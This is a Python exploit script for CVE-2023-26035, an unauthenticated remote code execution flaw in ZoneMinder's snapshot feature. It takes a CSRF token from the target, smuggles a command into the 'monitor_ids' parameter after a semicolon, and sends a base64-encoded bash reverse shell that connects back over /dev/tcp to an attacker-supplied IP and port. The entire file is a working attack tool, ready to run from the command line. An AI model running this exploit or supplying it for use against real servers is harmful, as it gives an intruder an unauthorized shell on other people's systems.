import re
from urllib import request, parse
import argparse
import base64

# Author: Josh Begleiter (@kaneda)
# Date: 2024/02/23
# Description: CVE-2023-26035 - Unauthenticated RCE in ZoneMinder Snapshots using only basic Python
#              enabling you to execute on a compromised box with only Python3
#
# Acknowledgements: thanks to Ravindu Wickramasinghe -> rvz (@RVIZX9) for the original script.

class ZoneMinderExploit:
    def __init__(self, target_uri):
        self.target_uri = target_uri
        self.csrf_magic = None

    def fetch_csrf_token(self):
        print("[>] fetching csrt token")
        response = request.urlopen(self.target_uri)
        self.csrf_magic = self.get_csrf_magic(response)
        if response.getcode() == 200 and re.match(r'^key:[a-f0-9]{40},\d+', self.csrf_magic):
            print(f"[>] recieved the token: {self.csrf_magic}")
            return True
        print("[!] unable to fetch or parse token.")
        return False

    def get_csrf_magic(self, response):
        for line in response.readlines():
            decoded_line = line.decode()
            if "__csrf_magic" in decoded_line:
                # It appears twice in the results, take whichever form comes first
                try:
                    return decoded_line.split('csrfMagicToken = "')[1].split('"')[0]
                except:
                    return decoded_line.split('value="')[1].split('"')[0]
        return ''

    def execute_command(self, cmd):
        print("[>] sending payload..")
        data = parse.urlencode({
            'view': 'snapshot', 
            'action': 'create', 
            'monitor_ids[0][Id]': f';{cmd}', 
            '__csrf_magic': self.csrf_magic
        }).encode()
        req = request.Request(f"{self.target_uri}/index.php", data=data)
        response = request.urlopen(req)
        print("[>] payload sent" if response.getcode() == 200 else "[!] failed to send payload")

    def exploit(self, payload):
        if self.fetch_csrf_token():
            print(f"[>] executing...")
            self.execute_command(payload)

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target-url', required=True, help='target url endpoint')
    parser.add_argument('-ip', '--local-ip', required=True, help='local ip')
    parser.add_argument('-p', '--port', required=True, help='port')
    args = parser.parse_args()

    # generating the payload
    ps1 = f"bash -i >& /dev/tcp/{args.local_ip}/{args.port} 0>&1"  
    ps2 = base64.b64encode(ps1.encode()).decode()
    payload = f"echo {ps2} | base64 -d | /bin/bash"

    ZoneMinderExploit(args.target_url).exploit(payload)

